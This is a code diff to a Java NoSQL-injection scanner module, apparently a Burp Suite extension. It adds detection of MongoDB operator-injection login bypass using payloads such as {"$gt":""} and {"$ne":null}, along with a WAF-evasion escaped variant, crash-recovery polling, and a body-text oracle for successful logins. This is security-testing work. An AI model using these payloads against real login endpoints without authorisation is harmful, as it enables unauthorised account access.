@@ -180,6 +180,11 @@ public final class NoSqlProbe {
     private static final Pattern PW_FIELD = Pattern.compile("(?i)(^|[_-])(pass|passwd|password|pwd|pin)([_-]|$)");
     private static final Pattern SESSION_COOKIE = Pattern.compile("(?i)(session|sess|sid|token|auth|jwt|connect\\.sid)");
     private static final Pattern LOGINISH = Pattern.compile("(?i)(login|signin|sign-in|logon|/error|unauthor)");
+    // Login-FAILURE markers in a response body — used by the body-content auth-bypass oracle (a wrong-creds
+    // baseline carries one; a successful $ne bypass does not). Generic across apps; not app-specific strings.
+    private static final Pattern LOGIN_FAIL = Pattern.compile(
+            "(?i)(bad cred|invalid|incorrect|denied|unauthor|wrong (pass|user|cred)|failed|no such (user|account)|"
+            + "not found|try again|login error)");
 
     private String knownUser = "";
     /** A username we KNOW is valid (the account our auth flow registered) — lets the auth-bypass check use a
@@ -198,6 +203,15 @@ public final class NoSqlProbe {
     private boolean authBypassJson(HttpRequest req, HttpRequestResponse base) {
         try {
             if (!"POST".equalsIgnoreCase(req.method())) return false;
+            // Fragile Node/Mongo apps CRASH under the probe battery (a SLEEP/$ne payload — irrelevant to a Mongo app
+            // but still an unhandled throw — kills the process); with a container restart policy they recover, but the
+            // restart window (Node boot + Mongo reconnect) can be tens of seconds. If the baseline is DOWN (HTTP 0),
+            // POLL for recovery (this is the load-free last phase) so the auth-bypass check isn't lost to a crash window.
+            for (int r = 0; r < 8 && (base == null || base.response() == null || base.response().statusCode() == 0); r++) {
+                try { Thread.sleep(4000); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
+                base = send(req);
+            }
+            if (base == null || base.response() == null || base.response().statusCode() == 0) return false;
             java.util.List<String[]> fields = new java.util.ArrayList<>();  // {name, baselineValue}
             String pwField = null, userField = null;
             for (ParsedHttpParameter p : req.parameters()) {
@@ -206,11 +220,26 @@ public final class NoSqlProbe {
                 if (PW_FIELD.matcher(p.name()).find()) pwField = p.name();
                 else if (userField == null) userField = p.name();
             }
+            // SPA/API logins POST a JSON body ({"email":…,"password":…}) whose keys do NOT appear in
+            // req.parameters() (Montoya only exposes form/url params) — so a JSON login endpoint (mongection
+            // POST /login) would be skipped. Parse the JSON body's string fields as credential candidates too.
+            if (pwField == null && isJson(req)) {
+                Matcher jf = Pattern.compile("\"([^\"]+)\"\\s*:\\s*\"([^\"\\\\]*(?:\\\\.[^\"\\\\]*)*)\"").matcher(req.bodyToString());
+                while (jf.find()) {
+                    String k = jf.group(1), v = jf.group(2);
+                    fields.add(new String[]{ k, v });
+                    if (PW_FIELD.matcher(k).find()) pwField = k;
+                    else if (userField == null) userField = k;
+                }
+            }
             if (pwField == null || fields.isEmpty()) return false;   // only credential-style POSTs
 
             java.util.List<String> bodies = new java.util.ArrayList<>();
             java.util.List<String> labels = new java.util.ArrayList<>();
-            for (String op : new String[]{ "{\"$ne\":null}", "{\"$gt\":\"\"}" }) {
+            // $gt:"" FIRST (safe, matches any non-empty value) — a null-valued $ne can crash some login handlers
+            // (mongection returns HTTP 000 on {$ne:null}); trying the safe operator first means the bypass is
+            // detected before any crash. $ne:null kept as a fallback for apps where $gt is filtered.
+            for (String op : new String[]{ "{\"$gt\":\"\"}", "{\"$ne\":null}" }) {
                 // (1) password-only with a KNOWN valid user — safest, no user-object crash
                 if (!knownUser.isBlank() && userField != null) {
                     StringBuilder sb = new StringBuilder("{");
@@ -249,11 +278,31 @@ public final class NoSqlProbe {
                 for (int i = 0; i < n; i++) { bodies.add(Evasion.jsonDollarEscape(bodies.get(i))); labels.add(labels.get(i) + " [WAF-evasion \\u0024]"); }
             }
 
+            // JSON baseline: the SAME login sent AS JSON with a deliberately-wrong password — the app's clean JSON
+            // failure. The handed request may be a FORM login whose form path behaves differently from its JSON path
+            // (goof's form login 500s on a broken middleware, but the JSON path works), so comparing a JSON injection
+            // to a FORM baseline is apples-to-oranges. This makes baseline AND injection both JSON.
+            HttpRequestResponse jsonBase = base;
+            try {
+                StringBuilder bb = new StringBuilder("{");
+                for (int j = 0; j < fields.size(); j++) {
+                    if (j > 0) bb.append(',');
+                    String n = fields.get(j)[0];
+                    String v = n.equals(pwField) ? "aiscInvalidPass9137"
+                            : (n.equals(userField) && !knownUser.isBlank()) ? knownUser
+                            : fields.get(j)[1];
+                    bb.append('"').append(esc(n)).append("\":\"").append(esc(v)).append('"');
+                }
+                HttpRequestResponse jb = send(req.withMethod("POST").withBody(bb.append('}').toString())
+                        .withUpdatedHeader("Content-Type", "application/json"));
+                if (jb != null && jb.response() != null) jsonBase = jb;
+            } catch (Throwable ignore) { }
+
             for (int i = 0; i < bodies.size(); i++) {
                 HttpRequest inj = req.withMethod("POST").withBody(bodies.get(i))
                         .withUpdatedHeader("Content-Type", "application/json");
                 HttpRequestResponse r = send(inj);
-                if (authBypassed(base, r)) {
+                if (authBypassed(jsonBase, r)) {
                     scanLog.found("NoSQL injection (authentication bypass)", req.url(),
                             "JSON operator injection [" + labels.get(i) + "] logged in without valid credentials "
                             + "— the login query treats the operator as a Mongo selector. Sent as a JSON body, so it "
@@ -277,6 +326,16 @@ public final class NoSqlProbe {
         String bl = location(base), il = location(inj);
         if (il != null && !il.equals(bl) && (bl == null || LOGINISH.matcher(bl).find()) && !LOGINISH.matcher(il).find())
             return true;                                                          // baseline→login, injected→elsewhere
+        // Body-content differential: the (wrong-creds) baseline shows a login-FAILURE marker but the injected 2xx
+        // response does NOT — the operator logged in with no valid creds. Covers apps that signal auth by BODY text
+        // alone, with no session cookie or redirect (200 "Welcome Again" vs 200 "Bad Credentials" — mongection).
+        try {
+            String bb = base.response().bodyToString(), ib = inj.response().bodyToString();
+            if (bb != null && ib != null && !ib.isBlank()
+                    && LOGIN_FAIL.matcher(bb).find() && !LOGIN_FAIL.matcher(ib).find()
+                    && Math.abs(ib.length() - bb.length()) > 8)
+                return true;
+        } catch (Throwable ignore) { }
         return false;
     }
 
